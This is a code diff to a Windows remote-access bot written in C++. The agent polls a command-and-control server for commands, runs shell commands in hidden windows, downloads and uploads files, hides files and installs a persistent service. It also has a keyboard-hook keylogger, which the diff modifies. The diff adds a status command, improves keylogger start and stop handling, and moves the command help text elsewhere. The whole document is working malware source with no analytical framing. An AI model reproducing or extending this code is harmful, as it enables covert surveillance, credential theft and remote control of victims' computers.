@@ -2,15 +2,11 @@
 #include "http.h"
 #include "crypt.h"
 #include "threads.h"
-#include "keylogger.h"
+#include "global.h"
+#include "extern.h"
 
 LRESULT WINAPI hook_keylogger(int nCode, WPARAM wParam, LPARAM lParam);
-FILE * keylogger_output_stream;
 std::string keylogger_file;
-bool keylogger_state;
-
-// threads structure
-THREAD threads[MAXTHREADS];
 
 using namespace std;
 
@@ -18,7 +14,7 @@ using namespace std;
 Constructor of the Class
 */
 
-Agent::Agent(const std::string& _server_url, const std::string& _botid, const unsigned int _sleep_interval, const std::string& _service_name, 
+Agent::Agent(const std::string& _server_url, const std::string& _botid, const unsigned int _sleep_interval, const std::string& _service_name,
 	const std::string& _user_agent, const std::string& _keylogger_file) {
 	if (_botid.empty()) {
 		botid = get_hostname();
@@ -55,19 +51,16 @@ string Agent::get_hostname() {
 	return hostname;
 }
 
-
 string Agent::get_os_name() {
 	string os_name = run_command("ver", true);
 	return os_name;
 }
-
 
 string Agent::get_wd() {
 	char cwd[MAX_PATH];
 	GetCurrentDirectoryA(MAX_PATH, cwd);
 	return cwd;
 }
-
 
 string Agent::get_next_command() {
 	std::vector<unsigned char> _cmd = http_request(server_url + "/api/pop?botid=" + botid + "&sysinfo=" + os_name, "GET", NULL, NULL, "", user_agent);
@@ -77,7 +70,7 @@ string Agent::get_next_command() {
 	wchar_t* wstr;
 
 	string cmd(_cmd.begin(), _cmd.end());
-    wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
+	wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
 	wstr = new wchar_t[wchars_num];
 	MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, wstr, wchars_num);
 	str = new char[wchars_num];
@@ -88,7 +81,6 @@ string Agent::get_next_command() {
 	delete[] str;
 	return cmd;
 }
-
 
 void Agent::send_output(const std::string& output) {
 	string url_encoded = url_encode(output);
@@ -118,14 +110,49 @@ void Agent::hide_unhide_file(const std::string& filename) {
 	if (dwAttrs & FILE_ATTRIBUTE_HIDDEN) {
 		SetFileAttributes(FileNameStr, (dwAttrs & !FILE_ATTRIBUTE_HIDDEN));
 		message = "unHidding file ";
-	} else {
+	}
+	else {
 		SetFileAttributesA(FileNameStr, (dwAttrs | FILE_ATTRIBUTE_HIDDEN));
-		message = "Hidding file ";	}
-	send_output(message + filename );
+		message = "Hidding file ";
+	}
+	send_output(message + filename);
+}
+
+void Agent::GetStatus(void)
+{
+	string message;
+	char errmsg[256];
+
+	message = "Status :";
+#ifdef DEBUGME
+	message.append(" WARNING DEBUG RELEASE !!!");
+#endif
+	message.append("\nHostname: ");
+	message.append(get_hostname());
+	message.append("\nOS Name:");
+	message.append(get_os_name());
+	message.append("\nWorking Dir:");
+	message.append(get_wd());
+	message.append("\nInterval of polling:");
+	_itoa(sleep_interval, errmsg, 10);
+	message.append(errmsg);
+	message.append("\nKeylogger state:");
+	if (keylogger_state == true)
+	{
+		message.append("Activated !\n destination file:");
+		message.append(keylogger_file);
+	}
+	else {
+		message.append("not activated");
+	}
+
+	send_output(message);
+	return;
 }
 
 void Agent::keylogger(bool state)
 {
+	KEYLOG keylog;
 	if (state == true) {
 		if (keylogger_state == true) {
 			send_output("Keylogger already running ...");
@@ -138,11 +165,28 @@ void Agent::keylogger(bool state)
 				send_output("ERROR the output file \"" + keylogger_file + "\" can't be opened, so keylogger can't start.");
 				return;
 			}
-			fprintf(keylogger_output_stream, "Keylogger file\n--------------\n");
+			fprintf(keylogger_output_stream, "\n\nKeylogger file\n--------------\n");
 			// ask to the second thread to initiate the keylogger process
 			keylogger_state = true;
-			keylogger_task = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WinAPIextentionK, (LPVOID)&keylogger_state, 0, 0);
-			send_output("Keylogger is started ...");
+			keylog.state = keylogger_state;
+
+			keylogger_task = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WinAPIextentionK, (LPVOID)&keylogger_state, 0, NULL);
+			if (keylogger_task == NULL)
+			{
+				DWORD dw = GetLastError();
+				char errmsg[256];
+				_itoa(dw, errmsg, 10);
+				string message = "Keylogger is NOT started ... (";
+				message.append(errmsg);
+				message.append(")\nlook at https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx for an explanation");
+				send_output(message);
+				fflush(keylogger_output_stream);
+				fclose(keylogger_output_stream);
+			}
+			else {
+				fflush(keylogger_output_stream);
+				send_output("Keylogger is started ...");
+			}
 			return;
 		}
 	}
@@ -155,17 +199,25 @@ void Agent::keylogger(bool state)
 			// OK we got enougth data, so we stop the keylogger
 			// ask to the second thread to end the keylogger process
 			keylogger_state = false;
-			wait_for_tick(); // do a sleep to be sure the hook is terminated
-			WaitForMultipleObjects(1, &keylogger_task, FALSE, sleep_interval * 1000); // now ask the system to be sure the thread is terminated
-			send_output("Keylogger STOPPED, and output file is \"" + keylogger_file + "\". Remember to upload it");
+			keylog.state = keylogger_state;
+			// now ask the system to be sure the thread is terminated
+			WaitForMultipleObjects(1, &keylogger_task, FALSE, sleep_interval * 1000);
+			// Send a QUIT to the window of keylogger
+			SendMessageA(keylogger_handle_window, WM_QUIT, 0, 0);
+			// do a sleep to be sure the hook is terminated
+			wait_for_tick();
+			// kill thread if it's not already killed
+			if (keylogger_task != NULL)
+			{
+				TerminateThread(keylogger_task, NULL);
+			}
+			send_output("Keylogger STOPPED, and output file is \"" + keylogger_file + "\". Remember to upload and delete it");
 			return;
 		}
 	}
 }
 
-
 std::string Agent::run_command(const std::string& command, bool isLocal) {
-
 	SECURITY_ATTRIBUTES saAttr;
 	HANDLE readOUT = NULL;
 	HANDLE writeOUT = NULL;
@@ -184,9 +236,9 @@ std::string Agent::run_command(const std::string& command, bool isLocal) {
 
 	siStartInfo.cb = sizeof(STARTUPINFO);
 
-		siStartInfo.hStdError = writeOUT;
-		siStartInfo.hStdOutput = writeOUT;
-		siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+	siStartInfo.hStdError = writeOUT;
+	siStartInfo.hStdOutput = writeOUT;
+	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
 	siStartInfo.wShowWindow = SW_HIDE;
 
@@ -209,7 +261,7 @@ std::string Agent::run_command(const std::string& command, bool isLocal) {
 	DWORD read;
 
 	PeekNamedPipe(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
-	while(read) {
+	while (read) {
 		ReadFile(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL);
 		cmd_output.append(cmdBuffer, read);
 		PeekNamedPipe(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
@@ -235,24 +287,7 @@ std::string Agent::run_command(const std::string& command, bool isLocal) {
 }
 
 void Agent::help() {
-	string help =
-		"Available commands\r\n"
-		"====================\r\n"
-		"You can stack commands with <com1>;<com2>;...\r\n"
-		"You can escape \";\" like this: \"\\;\"\r\n\r\n"
-		"cd <path>: change directory\r\n"
-		"<any shell command>: execute command and return output\r\n"
-		"persistence install|clean: install/remove persistent service\r\n"
-		"open <calc.exe>: run command asynchronously (no output)\r\n"
-		"download <http://url>: download file\r\n"
-		"hide_unhide <local/file>: Hide or unHide a local file\r\n"
-		"upload <local/file>: upload file\r\n"
-		"keylogger <start|stop>: start or stop keylogger sub-process\r\n"
-		"help: this help\r\n"
-		"exit: kill agent\r\n"
-		"setinterval <10>: set time interval between each CNC pull\r\n"
-		"setservicename <name>: change persistent service name\r\n"
-		"setkeyloggerfile <name>: change the output file of the keylogger";
+	string help = HELP_TEXT;
 	send_output(help);
 }
 
@@ -276,12 +311,10 @@ void Agent::download(const std::string& url) {
 	fwrite(&resp[0], 1, resp.size(), f);
 	fclose(f);
 
-	send_output("Downloaded: " + filename);
+	send_output("Downloaded: '" + filename + "' here : " + get_wd());
 }
 
-
 void Agent::upload(const std::string& filename) {
-
 	string basename = filename.substr(filename.rfind("/") + 1);
 	basename = basename.substr(basename.rfind("\\") + 1);
 
@@ -326,7 +359,6 @@ void Agent::setInterval(const unsigned int new_interval) {
 	char buffer[100];
 	_itoa(new_interval, buffer, 10);
 	send_output("Sleep interval is now " + string(buffer));
-
 }
 
 void Agent::setServiceName(const std::string& new_servicename) {
@@ -339,21 +371,21 @@ void Agent::setKeyloggerFile(const std::string & new_keylogger_file)
 	if (keylogger_state == true) {
 		// need to stop keylogger if it run
 		send_output("Keylogger is running, stop it before change output file");
-	} else {
+	}
+	else {
 		send_output("Keylogger filename is now " + new_keylogger_file + ". Remember to upload the old file \"" + keylogger_file + "\" if it's not empty.");
 		keylogger_file = new_keylogger_file;
 	}
 }
 
 void Agent::open(const std::string& args) {
-
 	PROCESS_INFORMATION piProcInfo;
 	STARTUPINFOA siStartInfo;
 	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
 	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
 	siStartInfo.cb = sizeof(STARTUPINFO);
 	siStartInfo.wShowWindow = SW_HIDE;
-	
+
 	CreateProcessA(NULL,
 		(LPSTR)args.c_str(),
 		NULL,
@@ -380,7 +412,6 @@ void Agent::open(const std::string& args) {
 	CloseHandle(piProcInfo.hProcess);
 }
 
-
 void Agent::cd(const std::string& newdir) {
 	int ret = _chdir(newdir.c_str());
 	if (ret == 0)
@@ -389,9 +420,7 @@ void Agent::cd(const std::string& newdir) {
 		send_output("Can't go to " + newdir + ". Stay in " + get_wd());
 }
 
-
 void Agent::persist(const std::string& options) {
-
 	char tempPath[MAX_PATH];
 	GetTempPathA(MAX_PATH, tempPath);
 
@@ -446,11 +475,9 @@ void Agent::stop() {
 		running = false;
 		send_output("This is the end,\nBeautiful friend,\nThis is the end,\nMy only friend, the end");
 	}
-	
 }
 
 void Agent::execute(const std::string& commandline) {
-
 	string command = commandline.substr(0, commandline.find(" "));
 	string args = commandline.substr(commandline.find(" ") + 1);
 
@@ -488,6 +515,10 @@ void Agent::execute(const std::string& commandline) {
 	// name of the persistent service
 	else if (command == "setservicename") {
 		setServiceName(args);
+	}
+	// display all status
+	else if (command == "status") {
+		GetStatus();
 	}
 	// name of the keylogger output file
 	else if (command == "setkeyloggerfile") {
@@ -542,7 +573,7 @@ void Agent::run() {
 					commandline.erase(found - 1, 1);
 					found = commandline.find(";", found);
 				}
-				if (found != string::npos) {		
+				if (found != string::npos) {
 					string cmd = commandline.substr(0, found);
 					commandline.erase(0, found + 1);
 					execute(cmd);
